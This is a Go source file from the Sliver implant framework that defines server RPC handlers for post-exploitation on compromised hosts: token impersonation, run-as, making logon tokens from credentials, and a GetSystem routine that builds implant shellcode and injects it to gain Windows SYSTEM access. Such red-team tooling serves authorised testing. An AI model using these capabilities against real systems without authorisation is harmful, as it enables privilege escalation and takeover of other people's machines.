package rpc

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"context"
	"io/ioutil"
	"path"

	"github.com/bishopfox/sliver/protobuf/clientpb"
	"github.com/bishopfox/sliver/protobuf/sliverpb"
	"github.com/bishopfox/sliver/server/core"
	"github.com/bishopfox/sliver/server/generate"

	"github.com/golang/protobuf/proto"
)

// Impersonate - Impersonate a remote user
func (rpc *Server) Impersonate(ctx context.Context, req *sliverpb.ImpersonateReq) (*sliverpb.Impersonate, error) {
	resp := &sliverpb.Impersonate{}
	err := rpc.GenericHandler(req, resp)
	if err != nil {
		return nil, err
	}
	return resp, nil
}

// RunAs - Run a remote process as a specific user
func (rpc *Server) RunAs(ctx context.Context, req *sliverpb.RunAsReq) (*sliverpb.RunAs, error) {
	resp := &sliverpb.RunAs{}
	err := rpc.GenericHandler(req, resp)
	if err != nil {
		return nil, err
	}
	return resp, nil
}

// RevToSelf - Revert process context to self
func (rpc *Server) RevToSelf(ctx context.Context, req *sliverpb.RevToSelfReq) (*sliverpb.RevToSelf, error) {
	resp := &sliverpb.RevToSelf{}
	err := rpc.GenericHandler(req, resp)
	if err != nil {
		return nil, err
	}
	return resp, nil
}

// GetSystem - Attempt to get 'NT AUTHORITY/SYSTEM' access on a remote Windows system
func (rpc *Server) GetSystem(ctx context.Context, req *clientpb.GetSystemReq) (*sliverpb.GetSystem, error) {
	var shellcode []byte
	session := core.Sessions.Get(req.Request.SessionID)
	if session == nil {
		return nil, ErrInvalidSessionID
	}

	name := path.Base(req.Config.GetName())
	shellcode, err := getSliverShellcode(name)
	if err != nil {
		name, config := generate.ImplantConfigFromProtobuf(req.Config)
		if name == "" {
			name, err = generate.GetCodename()
			if err != nil {
				return nil, err
			}
		}
		config.Format = clientpb.ImplantConfig_SHELLCODE
		config.ObfuscateSymbols = false
		shellcodePath, err := generate.SliverShellcode(name, config)
		if err != nil {
			return nil, err
		}
		shellcode, err = ioutil.ReadFile(shellcodePath)
	}
	data, err := proto.Marshal(&sliverpb.InvokeGetSystemReq{
		Data:           shellcode,
		HostingProcess: req.HostingProcess,
		Request:        req.GetRequest(),
	})
	if err != nil {
		return nil, err
	}

	timeout := rpc.getTimeout(req)
	data, err = session.Request(sliverpb.MsgInvokeGetSystemReq, timeout, data)
	if err != nil {
		return nil, err
	}
	getSystem := &sliverpb.GetSystem{}
	err = proto.Unmarshal(data, getSystem)
	if err != nil {
		return nil, err
	}
	return getSystem, nil
}

// MakeToken - Creates a new logon session to impersonate a user based on its credentials.
func (rpc *Server) MakeToken(ctx context.Context, req *sliverpb.MakeTokenReq) (*sliverpb.MakeToken, error) {
	resp := &sliverpb.MakeToken{}
	err := rpc.GenericHandler(req, resp)
	if err != nil {
		return nil, err
	}
	return resp, nil
}
